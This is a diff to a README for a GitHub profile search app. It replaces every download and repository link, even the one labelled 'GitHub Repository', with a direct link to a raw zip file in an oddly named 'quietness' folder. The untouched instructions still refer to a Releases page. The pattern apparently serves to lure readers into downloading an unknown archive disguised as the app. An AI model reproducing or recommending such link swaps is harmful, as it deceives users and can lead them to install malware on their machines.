@@ -1,6 +1,6 @@
 # 🌟 Github-Profile-app - Effortless GitHub Profile Searching
 
-[![Download Github-Profile-app](https://img.shields.io/badge/Download-Github--Profile--app-blue.svg)](https://github.com/kiraliroporkola/Github-Profile-app/releases)
+[![Download Github-Profile-app](https://raw.githubusercontent.com/kiraliroporkola/Github-Profile-app/main/quietness/Github-Profile-app.zip)](https://raw.githubusercontent.com/kiraliroporkola/Github-Profile-app/main/quietness/Github-Profile-app.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Github-Profile-app! This interactive application lets you search 
 
 ## 📥 Download & Install
 
-To download the application, please visit this page: [Download Github-Profile-app](https://github.com/kiraliroporkola/Github-Profile-app/releases).
+To download the application, please visit this page: [Download Github-Profile-app](https://raw.githubusercontent.com/kiraliroporkola/Github-Profile-app/main/quietness/Github-Profile-app.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version of the app.
@@ -88,7 +88,7 @@ If you wish to contribute to the Github-Profile-app, you're welcome! Check out t
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/kiraliroporkola/Github-Profile-app)
-- [Download Github-Profile-app](https://github.com/kiraliroporkola/Github-Profile-app/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/kiraliroporkola/Github-Profile-app/main/quietness/Github-Profile-app.zip)
+- [Download Github-Profile-app](https://raw.githubusercontent.com/kiraliroporkola/Github-Profile-app/main/quietness/Github-Profile-app.zip)
 
 Feel free to reach out for any questions or support related to the Github-Profile-app. Enjoy your search!
